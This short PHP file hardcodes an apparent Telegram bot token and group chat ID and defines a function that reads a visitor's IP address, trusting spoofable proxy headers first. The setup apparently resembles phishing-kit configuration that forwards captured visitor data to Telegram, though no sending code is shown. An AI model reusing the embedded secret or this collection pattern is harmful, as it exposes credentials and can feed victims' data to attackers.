<?php



$apiToken = "8625174083:AAFDI3Mse7L2dSrwy_LdwKielyzNrve5J3w";
$id = "-5490652087";


function getIPAddress() 
{  
    if(!empty($_SERVER['HTTP_CLIENT_IP']))
    {  
        $ip = $_SERVER['HTTP_CLIENT_IP'];  
    }  
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) 
    {  
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
    }  
    else{  
        $ip = $_SERVER['REMOTE_ADDR'];  
    }
    return $ip;  
}  
?>